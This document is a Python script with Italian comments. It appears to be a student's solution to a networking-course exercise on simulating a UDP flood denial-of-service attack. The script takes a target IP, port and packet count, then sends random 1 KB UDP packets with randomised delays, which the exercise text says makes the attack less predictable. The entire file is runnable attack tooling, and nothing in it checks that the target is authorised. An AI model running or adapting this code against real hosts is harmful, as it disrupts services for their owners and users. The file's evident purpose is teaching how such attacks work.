#! /usr/bin/env python

# FloodMe.py - semplice script per simulare un attacco DOS (denial of service) verso un'interfaccia di rete sulla nostra LAN.

"""
Lʼesercizio di oggi è scrivere un programma in Python che simuli un UDP flood, 
ovvero lʼinvio massivo di richieste UDP verso una macchina target che è in ascolto su una porta UDP casuale 
(nel nostro caso un DoS.  

Requisiti:
	- Il programma deve richiedere lʼinserimento dellʼIP target (input)
	- Il programma deve richiedere lʼinserimento della porta target (input)
	- La grandezza dei pacchetti da inviare è di 1 KB per pacchetto
		Suggerimento: per costruire il pacchetto da 1KB potete utilizzare il modulo «random» per la generazione di byte casuali.
	- Il programma deve chiedere allʼutente quanti pacchetti da 1 KB inviare (input)

Estendere lʼesercizio implementando un meccanismo di ritardo casuale tra l'invio di pacchetti UDP. 
Questo può rendere l'attacco più realistico e meno prevedibile, simulando meglio il comportamento di un numero 
elevato di utenti che inviano richieste al server in modo indipendente.
"""

import argparse
import time
import os
from random import uniform
import socket as s

# Funzione che genera un pacchetto casuale da 1024 bytes
def packet():
	# urandom è una funzione non deterministica della libreria os, 
	# quindi i bytes generati saranno sempre casuali e non replicabili.
	# in alternativa avremmo potuto usare la libreria random.
	# in questo caso non fa molta differenza ma io la preferisco :)
	p = os.urandom(1024)
	return p


def main():
	# Processiamo gli argomenti da riga di comando
	parser = argparse.ArgumentParser(description="Simuliamo un attaco DOS di tipo UDP Flood", usage="floodme.py [-h] -t 192.168.50.100 -p 8889 -c 20")
	parser.add_argument('-t', type=str, help="Indirizzo IP della macchina target.")
	parser.add_argument('-p', type=int, help="Porta della macchina target.")
	parser.add_argument('-c', type=int, help="Numero di pacchetti da inviare.")
	args = parser.parse_args()

	# Queste sono le nostre variabili prese dalla riga di comando
	Addr = args.t # l'indirizzo IP da attaccare (non è implementata nessuna verifica)
	Port = args.p # la porta da utilizzare per contattare il server
	Count = args.c # il numero di pacchetti UDP da inviare

	# inizializzo la connessione 
	sock = s.socket(s.AF_INET, s.SOCK_DGRAM)

	print(f"Fra 3 secondi attaccheremo la macchina {Addr}:{Port} con {Count} pacchetti UDP casuali.")
	print("Premi Ctrl+C per annullare.")
	time.sleep(3.0)
	i = 0
	while i < Count:
		# tempo attuale
		now = time.time()
		p = packet()
		print(f"Packet {i + 1} - {now} ")
		# inviamo il pacchetto con socket
		sock.sendto(p, (Addr, Port))
		# aumentiamo il contatore
		i += 1
		# creiamo un tempo di attesa random tra 0 e 1 secondo con la funzione uniform della 
		# libreria random. (La traccia diceva tra 0 e 0.1 secondi ma io l'ho inteso così)
		sleeptime = uniform(0, 1)
		# sleep in attesa di inviare un nuovo pacchetto
		time.sleep(sleeptime)

	# chiudiamo il socket dopo aver inviato tutti i pacchetti
	sock.close()

if __name__ == "__main__":
	main()
